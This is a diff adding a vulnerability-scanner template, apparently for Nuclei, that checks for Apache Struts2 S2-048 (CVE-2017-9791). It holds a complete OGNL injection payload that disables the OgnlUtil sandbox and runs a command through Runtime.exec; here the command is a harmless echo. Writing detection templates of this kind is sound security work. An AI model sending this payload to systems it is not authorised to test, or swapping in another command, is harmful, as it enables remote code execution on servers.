@@ -1,0 +1,29 @@
+id: local-struts2-s2-048-cmd-rce
+
+info:
+  name: Struts2 S2-048 Command Execution via Struts1 Integration (CVE-2017-9791)
+  author: pentest-platform
+  severity: critical
+  description: |
+    Apache Struts 2 S2-048 RCE via Struts1 Integration Plugin OGNL injection.
+    Executes echo command via OgnlUtil sandbox bypass and matches output in body.
+  tags: safe-poc,exploit,struts2,s2-048,cve,cve2017,rce
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/integration/saveGangster.action"
+      - "{{BaseURL}}/showcase/integration/saveGangster.action"
+    body: "name=${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\"com.opensymphony.xwork2.ActionContext.container\"]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\"echo pentest-platform-s2048-rce\").getInputStream())).(#q)}&age=1&description=test"
+    stop-at-first-match: true
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "pentest-platform-s2048-rce"
+      - type: status
+        status:
+          - 200
